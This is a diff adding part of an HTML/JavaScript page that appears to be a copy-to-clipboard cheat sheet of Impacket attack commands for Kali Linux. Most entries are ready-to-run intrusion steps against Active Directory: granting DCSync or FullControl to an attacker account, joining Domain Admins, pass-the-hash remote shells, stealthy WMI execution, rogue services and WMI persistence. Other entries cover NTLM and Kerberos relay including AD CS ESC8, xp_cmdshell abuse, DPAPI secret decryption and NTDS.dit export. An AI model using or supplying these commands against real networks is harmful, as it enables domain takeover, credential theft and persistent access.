+   cmds:[{lbl:'Add account',cmd:`impacket-addcomputer <v>DOMAIN.LOCAL</v>/<v>user</v>:<v>pass</v> <f>-computer-name</f> <v>EVILPC$</v> <f>-computer-pass</f> <v>EvilPass123!</v>`},{lbl:'With DC IP',cmd:`impacket-addcomputer <v>DOMAIN.LOCAL</v>/<v>user</v>:<v>pass</v> <f>-dc-ip</f> <v>10.10.10.10</v> <f>-computer-name</f> <v>EVILPC$</v> <f>-computer-pass</f> <v>EvilPass123!</v>`}]},
+  {cat:'ad',name:'impacket-dacledit',desc:'Read and modify DACLs on AD objects — DCSync, GenericAll, WriteDACL, WriteMembers.',
+   cmds:[{lbl:'Read DACL',cmd:`impacket-dacledit <v>DOMAIN.LOCAL</v>/<v>user</v>:<v>pass</v> <f>-action</f> <v>read</v> <f>-target</f> <v>victim_user</v>`},{lbl:'Grant DCSync',cmd:`impacket-dacledit <v>DOMAIN.LOCAL</v>/<v>user</v>:<v>pass</v> <f>-action</f> <v>write</v> <f>-rights</f> <v>DCSync</v> <f>-principal</f> <v>evil_user</v> <f>-target</f> <v>DOMAIN.LOCAL</v>`},{lbl:'Grant FullControl',cmd:`impacket-dacledit <v>DOMAIN.LOCAL</v>/<v>user</v>:<v>pass</v> <f>-action</f> <v>write</v> <f>-rights</f> <v>FullControl</v> <f>-principal</f> <v>evil_user</v> <f>-target</f> <v>victim_user</v>`},{lbl:'Grant WriteMembers',cmd:`impacket-dacledit <v>DOMAIN.LOCAL</v>/<v>user</v>:<v>pass</v> <f>-action</f> <v>write</v> <f>-rights</f> <v>WriteMembers</v> <f>-principal</f> <v>evil_user</v> <f>-target</f> <v>"Domain Admins"</v>`}]},
+  {cat:'ad',name:'impacket-owneredit',desc:'Change the owner of any Active Directory object.',
+   cmds:[{lbl:'Change owner',cmd:`impacket-owneredit <v>DOMAIN.LOCAL</v>/<v>user</v>:<v>pass</v> <f>-action</f> <v>write</v> <f>-new-owner</f> <v>evil_user</v> <f>-target</f> <v>victim_user</v>`},{lbl:'Read owner',cmd:`impacket-owneredit <v>DOMAIN.LOCAL</v>/<v>user</v>:<v>pass</v> <f>-action</f> <v>read</v> <f>-target</f> <v>victim_user</v>`}]},
+  {cat:'ad',name:'impacket-changepasswd',desc:'Change or reset a user password remotely via SAMR/MSRPC.',
+   cmds:[{lbl:'Self-change',cmd:`impacket-changepasswd <v>DOMAIN.LOCAL</v>/<v>user</v>:<v>OldPass</v>@<v>dc01</v> <f>-newpasswd</f> <v>NewPass123!</v>`},{lbl:'Admin reset',cmd:`impacket-changepasswd <v>DOMAIN.LOCAL</v>/<v>admin</v>:<v>pass</v>@<v>dc01</v> <f>-reset</f> <f>-newpasswd</f> <v>NewPass123!</v> <f>-altuser</f> <v>targetuser</v>`}]},
+
+  /* REMOTE */
+  {cat:'remote',name:'impacket-psexec',desc:'PsExec-style execution via SMB. Drops service binary, gets SYSTEM shell. Most reliable.',
+   cmds:[{lbl:'Password auth',cmd:`impacket-psexec <v>DOMAIN.LOCAL</v>/<v>Administrator</v>:<v>pass</v>@<v>192.168.1.10</v>`},{lbl:'Pass-the-Hash',cmd:`impacket-psexec <v>DOMAIN.LOCAL</v>/<v>Administrator</v>@<v>192.168.1.10</v> <f>-hashes</f> <v>:ntlmhash</v>`},{lbl:'Single command',cmd:`impacket-psexec <v>DOMAIN.LOCAL</v>/<v>user</v>:<v>pass</v>@<v>192.168.1.10</v> <v>whoami</v>`},{lbl:'Kerberos',cmd:`impacket-psexec <v>DOMAIN.LOCAL</v>/<v>user</v>@<v>dc01.domain.local</v> <f>-k</f> <f>-no-pass</f>`}]},
+  {cat:'remote',name:'impacket-wmiexec',desc:'WMI-based semi-interactive shell. No service created — stealthier than psexec.',
+   cmds:[{lbl:'Password auth',cmd:`impacket-wmiexec <v>DOMAIN.LOCAL</v>/<v>Administrator</v>:<v>pass</v>@<v>192.168.1.10</v>`},{lbl:'Pass-the-Hash',cmd:`impacket-wmiexec <v>DOMAIN.LOCAL</v>/<v>Administrator</v>@<v>192.168.1.10</v> <f>-hashes</f> <v>:ntlmhash</v>`},{lbl:'Run command',cmd:`impacket-wmiexec <v>DOMAIN.LOCAL</v>/<v>user</v>:<v>pass</v>@<v>192.168.1.10</v> <v>"cmd /c whoami"</v>`},{lbl:'No output (stealth)',cmd:`impacket-wmiexec <v>DOMAIN.LOCAL</v>/<v>user</v>:<v>pass</v>@<v>192.168.1.10</v> <f>-nooutput</f> <v>"cmd /c ..."</v>`}]},
+  {cat:'remote',name:'impacket-smbexec',desc:'SMB execution via temporary service creation. No binary dropped to disk.',
+   cmds:[{lbl:'Password auth',cmd:`impacket-smbexec <v>DOMAIN.LOCAL</v>/<v>Administrator</v>:<v>pass</v>@<v>192.168.1.10</v>`},{lbl:'Pass-the-Hash',cmd:`impacket-smbexec <v>DOMAIN.LOCAL</v>/<v>Administrator</v>@<v>192.168.1.10</v> <f>-hashes</f> <v>:ntlmhash</v>`}]},
+  {cat:'remote',name:'impacket-atexec',desc:'Execute commands via Windows Task Scheduler (AT service).',
+   cmds:[{lbl:'Run command',cmd:`impacket-atexec <v>DOMAIN.LOCAL</v>/<v>Administrator</v>:<v>pass</v>@<v>192.168.1.10</v> <v>whoami</v>`},{lbl:'Pass-the-Hash',cmd:`impacket-atexec <v>DOMAIN.LOCAL</v>/<v>Administrator</v>@<v>192.168.1.10</v> <f>-hashes</f> <v>:ntlmhash</v> <v>whoami</v>`}]},
+  {cat:'remote',name:'impacket-dcomexec',desc:'DCOM-based execution using MMC20.Application, ShellWindows, or ShellBrowserWindow.',
+   cmds:[{lbl:'MMC20 (default)',cmd:`impacket-dcomexec <v>DOMAIN.LOCAL</v>/<v>Administrator</v>:<v>pass</v>@<v>192.168.1.10</v>`},{lbl:'ShellWindows',cmd:`impacket-dcomexec <v>DOMAIN.LOCAL</v>/<v>Administrator</v>:<v>pass</v>@<v>192.168.1.10</v> <f>-object</f> <v>ShellWindows</v>`},{lbl:'ShellBrowserWindow',cmd:`impacket-dcomexec <v>DOMAIN.LOCAL</v>/<v>Administrator</v>:<v>pass</v>@<v>192.168.1.10</v> <f>-object</f> <v>ShellBrowserWindow</v>`},{lbl:'Pass-the-Hash',cmd:`impacket-dcomexec <v>DOMAIN.LOCAL</v>/<v>Administrator</v>@<v>192.168.1.10</v> <f>-hashes</f> <v>:ntlmhash</v>`}]},
+  {cat:'remote',name:'impacket-services',desc:'Manage Windows services remotely — list, create, start, stop, delete.',
+   cmds:[{lbl:'List services',cmd:`impacket-services <v>DOMAIN.LOCAL</v>/<v>user</v>:<v>pass</v>@<v>192.168.1.10</v> list`},{lbl:'Create service',cmd:`impacket-services <v>DOMAIN.LOCAL</v>/<v>user</v>:<v>pass</v>@<v>192.168.1.10</v> create <f>-name</f> <v>evilsvc</v> <f>-display</f> <v>"Evil"</v> <f>-path</f> <v>C:\\\\evil.exe</v>`},{lbl:'Start service',cmd:`impacket-services <v>DOMAIN.LOCAL</v>/<v>user</v>:<v>pass</v>@<v>192.168.1.10</v> start <f>-name</f> <v>evilsvc</v>`},{lbl:'Delete service',cmd:`impacket-services <v>DOMAIN.LOCAL</v>/<v>user</v>:<v>pass</v>@<v>192.168.1.10</v> delete <f>-name</f> <v>evilsvc</v>`}]},
+  {cat:'remote',name:'impacket-wmipersist',desc:'Establish WMI event subscription persistence.',
+   cmds:[{lbl:'Install',cmd:`impacket-wmipersist <v>DOMAIN.LOCAL</v>/<v>user</v>:<v>pass</v>@<v>192.168.1.10</v> install <f>-name</f> <v>Updater</v> <f>-interval</f> <v>5</v> <f>-action</f> <v>"cmd /c ..."</v>`},{lbl:'Remove',cmd:`impacket-wmipersist <v>DOMAIN.LOCAL</v>/<v>user</v>:<v>pass</v>@<v>192.168.1.10</v> remove <f>-name</f> <v>Updater</v>`}]},
+
+  /* MITM */
+  {cat:'mitm',name:'impacket-ntlmrelayx',desc:'NTLM relay — relay captured NTLM auth to SMB, LDAP, AD CS, MSSQL, and more.',
+   cmds:[{lbl:'Relay → SMB (dump SAM)',cmd:`impacket-ntlmrelayx <f>-tf</f> <v>targets.txt</v> <f>-smb2support</f>`},{lbl:'Interactive SMB shell',cmd:`impacket-ntlmrelayx <f>-tf</f> <v>targets.txt</v> <f>-smb2support</f> <f>-i</f>`},{lbl:'Relay → LDAP (add computer)',cmd:`impacket-ntlmrelayx <f>-t</f> <v>ldap://dc01.domain.local</v> <f>--add-computer</f>`},{lbl:'Relay → LDAPS (shadow cred)',cmd:`impacket-ntlmrelayx <f>-t</f> <v>ldaps://dc01.domain.local</v> <f>--shadow-credentials</f> <f>--shadow-target</f> <v>dc01$</v>`},{lbl:'ESC8 — AD CS HTTP relay',cmd:`impacket-ntlmrelayx <f>-t</f> <v>http://ca.domain.local/certsrv/certfnsh.asp</v> <f>--adcs</f> <f>--template</f> <v>DomainController</v>`},{lbl:'SOCKS proxy mode',cmd:`impacket-ntlmrelayx <f>-tf</f> <v>targets.txt</v> <f>-smb2support</f> <f>-socks</f>`},{lbl:'Execute command',cmd:`impacket-ntlmrelayx <f>-tf</f> <v>targets.txt</v> <f>-smb2support</f> <f>-c</f> <v>"whoami > C:\\\\out.txt"</v>`},{lbl:'Relay → MSSQL',cmd:`impacket-ntlmrelayx <f>-t</f> <v>mssql://192.168.1.10</v> <f>-q</f> <v>"SELECT 1"</v>`}]},
+  {cat:'mitm',name:'impacket-krbrelayx',desc:'Kerberos relay attacks — unconstrained delegation abuse, AP-REQ relay.',
+   cmds:[{lbl:'Relay to LDAP',cmd:`impacket-krbrelayx <f>-t</f> <v>ldap://dc01.domain.local</v>`},{lbl:'With AES key',cmd:`impacket-krbrelayx <f>-aesKey</f> <v>aeskey256</v> <f>-t</f> <v>ldap://dc01</v>`}]},
+
+  /* MSSQL */
+  {cat:'mssql',name:'impacket-mssqlclient',desc:'Interactive MSSQL client. Enable xp_cmdshell, file I/O, privilege escalation, linked servers.',
+   cmds:[{lbl:'SQL auth',cmd:`impacket-mssqlclient <v>sa</v>:<v>Password123</v>@<v>192.168.1.10</v>`},{lbl:'Windows auth',cmd:`impacket-mssqlclient <v>DOMAIN.LOCAL</v>/<v>user</v>:<v>pass</v>@<v>192.168.1.10</v> <f>-windows-auth</f>`},{lbl:'Pass-the-Hash',cmd:`impacket-mssqlclient <v>DOMAIN.LOCAL</v>/<v>user</v>@<v>192.168.1.10</v> <f>-hashes</f> <v>:ntlmhash</v> <f>-windows-auth</f>`},{lbl:'Kerberos',cmd:`impacket-mssqlclient <v>DOMAIN.LOCAL</v>/<v>user</v>@<v>mssql.domain.local</v> <f>-k</f> <f>-no-pass</f>`},{lbl:'Enable xp_cmdshell',cmd:`<c>SQL> </c>ENABLE_XP_CMDSHELL`},{lbl:'OS command via xp_cmdshell',cmd:`<c>SQL> </c>xp_cmdshell whoami`},{lbl:'Read file',cmd:`<c>SQL> </c>GET_FILE C:\\\\Windows\\\\win.ini`},{lbl:'Write file',cmd:`<c>SQL> </c>PUT_FILE /tmp/evil.exe C:\\\\Temp\\\\evil.exe`},{lbl:'Linked server exec',cmd:`<c>SQL> </c>use_link <v>LINKEDSRV</v>; xp_cmdshell whoami`}]},
+  {cat:'mssql',name:'impacket-mssqlinstance',desc:'Discover MSSQL instances on the network via UDP broadcast (port 1434).',
+   cmds:[{lbl:'Discover instances',cmd:`impacket-mssqlinstance <v>192.168.1.0/24</v>`}]},
+
+  /* MISC */
+  {cat:'misc',name:'impacket-dpapi',desc:'Decrypt DPAPI protected secrets — masterkeys, blobs, browser creds, certificates.',
+   cmds:[{lbl:'Masterkey (password)',cmd:`impacket-dpapi masterkey <f>-file</f> <v>/path/masterkey</v> <f>-password</f> <v>Password123</v>`},{lbl:'Masterkey (domain pvk)',cmd:`impacket-dpapi masterkey <f>-file</f> <v>masterkey</v> <f>-pvk</f> <v>domain.pvk</v>`},{lbl:'Decrypt blob',cmd:`impacket-dpapi blob <f>-masterkey</f> <v>masterkey_hex</v> <f>-file</f> <v>blob.bin</v>`},{lbl:'Credential file',cmd:`impacket-dpapi credential <f>-file</f> <v>cred_blob</v> <f>-key</f> <v>masterkey_hex</v>`}]},
+  {cat:'misc',name:'impacket-esentutl',desc:'Read and export ESE databases (NTDS.dit, AD, Exchange).',
+   cmds:[{lbl:'List tables',cmd:`impacket-esentutl <v>ntds.dit</v>`},{lbl:'Export datatable',cmd:`impacket-esentutl <v>ntds.dit</v> <f>-table</f> <v>datatable</v>`},{lbl:'Export link_table',cmd:`impacket-esentutl <v>ntds.dit</v> <f>-table</f> <v>link_table</v>`}]},
+  {cat:'misc',name:'impacket-sniffer',desc:'Raw packet sniffer — capture network traffic on a local interface.',
+   cmds:[{lbl:'Sniff on interface',cmd:`impacket-sniffer <f>-i</f> <v>eth0</v>`},{lbl:'Filter by port',cmd:`impacket-sniffer <f>-i</f> <v>eth0</v> <f>-f</f> <v>"tcp port 445"</v>`}]},
+  {cat:'misc',name:'impacket-ping / ping6',desc:'ICMP and ICMPv6 ping using raw sockets.',
+   cmds:[{lbl:'ICMP ping',cmd:`impacket-ping <v>192.168.1.10</v>`},{lbl:'ICMPv6 ping',cmd:`impacket-ping6 <v>fe80::1</v>`}]},
+  {cat:'misc',name:'impacket-ntfs-read',desc:'Read NTFS filesystem bypassing file lock restrictions.',
+   cmds:[{lbl:'Read NTFS share',cmd:`impacket-ntfs-read <v>\\\\\\\\192.168.1.10\\\\C$</v>`}]},
+  {cat:'misc',name:'impacket-wmiquery',desc:'Execute raw WMI queries remotely.',
+   cmds:[{lbl:'Query processes',cmd:`impacket-wmiquery <v>DOMAIN.LOCAL</v>/<v>user</v>:<v>pass</v>@<v>192.168.1.10</v> <f>-query</f> <v>"SELECT * FROM Win32_Process"</v>`},{lbl:'Query users',cmd:`impacket-wmiquery <v>DOMAIN.LOCAL</v>/<v>user</v>:<v>pass</v>@<v>192.168.1.10</v> <f>-query</f> <v>"SELECT * FROM Win32_UserAccount"</v>`}]},
+];
+
+function renderCmd(cmd){
+  return cmd
+    .replace(/<v>/g,"<span class='val'>").replace(/<\/v>/g,'</span>')
+    .replace(/<f>/g,"<span class='flag'>").replace(/<\/f>/g,'</span>')
+    .replace(/<c>/g,"<span class='comment'>").replace(/<\/c>/g,'</span>');
+}
+
+function build(){
+  const content=document.getElementById('mainContent');
+  content.innerHTML='';
+  let total=0;
+  Object.keys(CATS).forEach(cat=>{
+    const tools=TOOLS.filter(t=>t.cat===cat);
+    if(!tools.length)return;
+    const sec=document.createElement('div');
+    sec.className=`cat-section cat-${cat}`;
+    sec.dataset.cat=cat;
+    const meta=CATS[cat];
+    sec.innerHTML=`<div class="cat-header"><span class="cat-icon">${meta.icon}</span><span class="cat-label">${meta.label}</span><span class="cat-count-badge">${tools.length} TOOLS</span></div><div class="tools-grid" id="grid-${cat}"></div>`;
+    content.appendChild(sec);
+    const grid=document.getElementById(`grid-${cat}`);
+    tools.forEach(tool=>{
+      const card=document.createElement('div');
+      card.className='tool-card';
+      card.dataset.search=(tool.name+' '+tool.desc+' '+tool.cmds.map(c=>c.lbl+' '+c.cmd.replace(/<[^>]+>/g,'')).join(' ')).toLowerCase();
+      const cmdsHTML=tool.cmds.map(cmd=>`<div class="cmd-block" onclick="copyCmd(this)"><div class="cmd-top"><span class="cmd-label">${cmd.lbl}</span><span class="copy-hint">[ COPY ]</span></div><div class="cmd-text">${renderCmd(cmd.cmd)}</div></div>`).join('');
+      card.innerHTML=`<div class="tool-name">${tool.name}</div><div class="tool-desc">${tool.desc}</div>${cmdsHTML}`;
+      grid.appendChild(card);
+      total++;
+    });
+  });
+  document.getElementById('totalCount').textContent=total;
+  document.getElementById('visibleCount').textContent=total;
+}
+
+function copyCmd(el){
+  // Clone the cmd-text node, remove all .comment spans, then grab innerText
+  const clone = el.querySelector('.cmd-text').cloneNode(true);
+  clone.querySelectorAll('.comment').forEach(n => n.remove());
+  const text = clone.innerText.trim();
+  navigator.clipboard.writeText(text).catch(()=>{});
+  const t=document.getElementById('toast');
+  t.classList.add('show');
+  setTimeout(()=>t.classList.remove('show'),1400);
+}
+
+let currentCat='all';
+function applyFilter(){
+  const q=document.getElementById('searchInput').value.toLowerCase().trim();
+  let visible=0;
+  document.querySelectorAll('.cat-section').forEach(sec=>{
+    const catOk=currentCat==='all'||currentCat===sec.dataset.cat;
+    let any=false;
+    sec.querySelectorAll('.tool-card').forEach(card=>{
+      const match=catOk&&(!q||card.dataset.search.includes(q));
+      card.classList.toggle('hidden',!match);
+      if(match){any=true;visible++;}
+    });
+    sec.style.display=any?'':'none';
+  });
+  document.getElementById('visibleCount').textContent=visible;
+  document.getElementById('noResults').style.display=visible===0?'block':'none';
+}
+
+document.querySelectorAll('.flt').forEach(btn=>{
+  btn.addEventListener('click',()=>{
+    document.querySelectorAll('.flt').forEach(b=>b.classList.remove('active'));
+    btn.classList.add('active');
+    currentCat=btn.dataset.cat;
+    applyFilter();
+  });
+});
+document.getElementById('searchInput').addEventListener('input',applyFilter);
+build();
+
+setInterval(()=>{
+  const n=new Date();
+  document.getElementById('sysInfo').innerHTML=`PLATFORM: <span>KALI LINUX</span><br>FORMAT: <span>impacket-toolname</span><br>TIME: <span>${n.toTimeString().split(' ')[0]}</span>`;
+},1000);
+</script>
+</body>
+</html>
